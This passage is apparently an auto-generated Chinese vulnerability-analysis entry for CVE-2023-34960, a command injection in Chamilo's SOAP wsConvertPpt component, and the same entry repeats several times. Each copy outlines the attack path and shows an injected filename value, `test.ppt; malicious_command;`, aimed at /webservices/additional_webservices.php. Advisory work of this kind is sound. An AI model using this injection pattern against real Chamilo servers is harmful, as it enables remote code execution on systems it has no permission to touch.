提供的POC代码只是一个`README.md`文件，内容非常简短，只说明了漏洞和利用的API端点，没有包含任何可执行的代码。因此，从代码本身来看，不存在明显的投毒代码。然而，整个仓库可能被用于传播恶意软件或其他目的，或者未来的提交可能会包含恶意代码，因此投毒风险评估为10%。这个数字考虑了开发者可能在其他地方（如依赖项或后续更新）引入恶意代码的可能性，虽然当前POC本身看起来是安全的。

**利用方式分析：**
1.  攻击者构造一个包含恶意命令的PowerPoint文件名，例如 `test.ppt; malicious_command;`。
2.  攻击者通过SOAP API调用Chamilo的`/webservices/additional_webservices.php`接口。
3.  在SOAP请求中，将包含恶意命令的文件名作为参数传递给`wsConvertPpt`组件。
4.  `wsConvertPpt`组件处理PowerPoint文件名时，由于没有正确地过滤特殊字符，导致恶意命令被执行，从而实现远程代码执行。

**项目地址:** [mr-won/cve-2023-34960](https://github.com/mr-won/cve-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---



---

## POC #7

**来源**: [CVE-2023-34960-mr-won_cve-2023-34960.md](../2023/CVE-2023-34960-mr-won_cve-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要访问Chamilo的SOAP API接口/webservices/additional_webservices.php

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-34960是Chamilo v1.11.* 到 v1.11.18版本中wsConvertPpt组件存在的一个命令注入漏洞。攻击者可以通过构造包含恶意命令的PowerPoint文件名，并利用SOAP API调用/webservices/additional_webservices.php接口来执行任意命令。 

**有效性分析：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以判断该漏洞利用是有效的。搜索引擎结果中多个链接都指向了该漏洞的描述，并且Rapid7 Metasploit已经发布了利用该漏洞的模块，表明该漏洞是可被利用的。
提供的POC代码`/tmp/176d720a26918eb35b36eadd06dede84/README.md`虽然简单，但明确指出了利用的API端点和漏洞类型，说明存在已知的利用方法。

**投毒风险分析：**
提供的POC代码只是一个`README.md`文件，内容非常简短，只说明了漏洞和利用的API端点，没有包含任何可执行的代码。因此，从代码本身来看，不存在明显的投毒代码。然而，整个仓库可能被用于传播恶意软件或其他目的，或者未来的提交可能会包含恶意代码，因此投毒风险评估为10%。这个数字考虑了开发者可能在其他地方（如依赖项或后续更新）引入恶意代码的可能性，虽然当前POC本身看起来是安全的。

**利用方式分析：**
1.  攻击者构造一个包含恶意命令的PowerPoint文件名，例如 `test.ppt; malicious_command;`。
2.  攻击者通过SOAP API调用Chamilo的`/webservices/additional_webservices.php`接口。
3.  在SOAP请求中，将包含恶意命令的文件名作为参数传递给`wsConvertPpt`组件。
4.  `wsConvertPpt`组件处理PowerPoint文件名时，由于没有正确地过滤特殊字符，导致恶意命令被执行，从而实现远程代码执行。

**项目地址:** [mr-won/cve-2023-34960](https://github.com/mr-won/cve-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---



---

## POC #7

**来源**: [CVE-2023-34960-mr-won_cve-2023-34960.md](../2023/CVE-2023-34960-mr-won_cve-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要访问Chamilo的SOAP API接口/webservices/additional_webservices.php

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-34960是Chamilo v1.11.* 到 v1.11.18版本中wsConvertPpt组件存在的一个命令注入漏洞。攻击者可以通过构造包含恶意命令的PowerPoint文件名，并利用SOAP API调用/webservices/additional_webservices.php接口来执行任意命令。 

**有效性分析：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以判断该漏洞利用是有效的。搜索引擎结果中多个链接都指向了该漏洞的描述，并且Rapid7 Metasploit已经发布了利用该漏洞的模块，表明该漏洞是可被利用的。
提供的POC代码`/tmp/176d720a26918eb35b36eadd06dede84/README.md`虽然简单，但明确指出了利用的API端点和漏洞类型，说明存在已知的利用方法。

**投毒风险分析：**
提供的POC代码只是一个`README.md`文件，内容非常简短，只说明了漏洞和利用的API端点，没有包含任何可执行的代码。因此，从代码本身来看，不存在明显的投毒代码。然而，整个仓库可能被用于传播恶意软件或其他目的，或者未来的提交可能会包含恶意代码，因此投毒风险评估为10%。这个数字考虑了开发者可能在其他地方（如依赖项或后续更新）引入恶意代码的可能性，虽然当前POC本身看起来是安全的。

**利用方式分析：**
1.  攻击者构造一个包含恶意命令的PowerPoint文件名，例如 `test.ppt; malicious_command;`。
2.  攻击者通过SOAP API调用Chamilo的`/webservices/additional_webservices.php`接口。
3.  在SOAP请求中，将包含恶意命令的文件名作为参数传递给`wsConvertPpt`组件。
4.  `wsConvertPpt`组件处理PowerPoint文件名时，由于没有正确地过滤特殊字符，导致恶意命令被执行，从而实现远程代码执行。

**项目地址:** [mr-won/cve-2023-34960](https://github.com/mr-won/cve-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---



---

## POC #7

**来源**: [CVE-2023-34960-mr-won_cve-2023-34960.md](../2023/CVE-2023-34960-mr-won_cve-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要访问Chamilo的SOAP API接口/webservices/additional_webservices.php

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-34960是Chamilo v1.11.* 到 v1.11.18版本中wsConvertPpt组件存在的一个命令注入漏洞。攻击者可以通过构造包含恶意命令的PowerPoint文件名，并利用SOAP API调用/webservices/additional_webservices.php接口来执行任意命令。 

**有效性分析：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以判断该漏洞利用是有效的。搜索引擎结果中多个链接都指向了该漏洞的描述，并且Rapid7 Metasploit已经发布了利用该漏洞的模块，表明该漏洞是可被利用的。
提供的POC代码`/tmp/176d720a26918eb35b36eadd06dede84/README.md`虽然简单，但明确指出了利用的API端点和漏洞类型，说明存在已知的利用方法。

**投毒风险分析：**
提供的POC代码只是一个`README.md`文件，内容非常简短，只说明了漏洞和利用的API端点，没有包含任何可执行的代码。因此，从代码本身来看，不存在明显的投毒代码。然而，整个仓库可能被用于传播恶意软件或其他目的，或者未来的提交可能会包含恶意代码，因此投毒风险评估为10%。这个数字考虑了开发者可能在其他地方（如依赖项或后续更新）引入恶意代码的可能性，虽然当前POC本身看起来是安全的。

**利用方式分析：**
1.  攻击者构造一个包含恶意命令的PowerPoint文件名，例如 `test.ppt; malicious_command;`。
2.  攻击者通过SOAP API调用Chamilo的`/webservices/additional_webservices.php`接口。
3.  在SOAP请求中，将包含恶意命令的文件名作为参数传递给`wsConvertPpt`组件。
4.  `wsConvertPpt`组件处理PowerPoint文件名时，由于没有正确地过滤特殊字符，导致恶意命令被执行，从而实现远程代码执行。

**项目地址:** [mr-won/cve-2023-34960](https://github.com/mr-won/cve-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---



---

## POC #7

**来源**: [CVE-2023-34960-mr-won_cve-2023-34960.md](../2023/CVE-2023-34960-mr-won_cve-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要访问Chamilo的SOAP API接口/webservices/additional_webservices.php

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-34960是Chamilo v1.11.* 到 v1.11.18版本中wsConvertPpt组件存在的一个命令注入漏洞。攻击者可以通过构造包含恶意命令的PowerPoint文件名，并利用SOAP API调用/webservices/additional_webservices.php接口来执行任意命令。 

**有效性分析：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以判断该漏洞利用是有效的。搜索引擎结果中多个链接都指向了该漏洞的描述，并且Rapid7 Metasploit已经发布了利用该漏洞的模块，表明该漏洞是可被利用的。
提供的POC代码`/tmp/176d720a26918eb35b36eadd06dede84/README.md`虽然简单，但明确指出了利用的API端点和漏洞类型，说明存在已知的利用方法。

**投毒风险分析：**
提供的POC代码只是一个`README.md`文件，内容非常简短，只说明了漏洞和利用的API端点，没有包含任何可执行的代码。因此，从代码本身来看，不存在明显的投毒代码。然而，整个仓库可能被用于传播恶意软件或其他目的，或者未来的提交可能会包含恶意代码，因此投毒风险评估为10%。这个数字考虑了开发者可能在其他地方（如依赖项或后续更新）引入恶意代码的可能性，虽然当前POC本身看起来是安全的。

**利用方式分析：**
1.  攻击者构造一个包含恶意命令的PowerPoint文件名，例如 `test.ppt; malicious_command;`。
2.  攻击者通过SOAP API调用Chamilo的`/webservices/additional_webservices.php`接口。
3.  在SOAP请求中，将包含恶意命令的文件名作为参数传递给`wsConvertPpt`组件。
4.  `wsConvertPpt`组件处理PowerPoint文件名时，由于没有正确地过滤特殊字符，导致恶意命令被执行，从而实现远程代码执行。

**项目地址:** [mr-won/cve-2023-34960](https://github.com/mr-won/cve-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---



---

## POC #7

**来源**: [CVE-2023-34960-mr-won_cve-2023-34960.md](../2023/CVE-2023-34960-mr-won_cve-2023-34960.md)

## CVE-2023-34960-Chamilo-命令注入

**漏洞编号:** CVE-2023-34960

**漏洞类型:** 命令注入

**影响应用:** Chamilo

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** v1.11.* up to v1.11.18

**利用条件:** 需要访问Chamilo的SOAP API接口/webservices/additional_webservices.php

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-34960是Chamilo v1.11.* 到 v1.11.18版本中wsConvertPpt组件存在的一个命令注入漏洞。攻击者可以通过构造包含恶意命令的PowerPoint文件名，并利用SOAP API调用/webservices/additional_webservices.php接口来执行任意命令。 

**有效性分析：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以判断该漏洞利用是有效的。搜索引擎结果中多个链接都指向了该漏洞的描述，并且Rapid7 Metasploit已经发布了利用该漏洞的模块，表明该漏洞是可被利用的。
提供的POC代码`/tmp/176d720a26918eb35b36eadd06dede84/README.md`虽然简单，但明确指出了利用的API端点和漏洞类型，说明存在已知的利用方法。

**投毒风险分析：**
提供的POC代码只是一个`README.md`文件，内容非常简短，只说明了漏洞和利用的API端点，没有包含任何可执行的代码。因此，从代码本身来看，不存在明显的投毒代码。然而，整个仓库可能被用于传播恶意软件或其他目的，或者未来的提交可能会包含恶意代码，因此投毒风险评估为10%。这个数字考虑了开发者可能在其他地方（如依赖项或后续更新）引入恶意代码的可能性，虽然当前POC本身看起来是安全的。

**利用方式分析：**
1.  攻击者构造一个包含恶意命令的PowerPoint文件名，例如 `test.ppt; malicious_command;`。
2.  攻击者通过SOAP API调用Chamilo的`/webservices/additional_webservices.php`接口。
3.  在SOAP请求中，将包含恶意命令的文件名作为参数传递给`wsConvertPpt`组件。
4.  `wsConvertPpt`组件处理PowerPoint文件名时，由于没有正确地过滤特殊字符，导致恶意命令被执行，从而实现远程代码执行。

**项目地址:** [mr-won/cve-2023-34960](https://github.com/mr-won/cve-2023-34960)

**漏洞详情:** [CVE-2023-34960](https://nvd.nist.gov/vuln/detail/CVE-2023-34960)

---

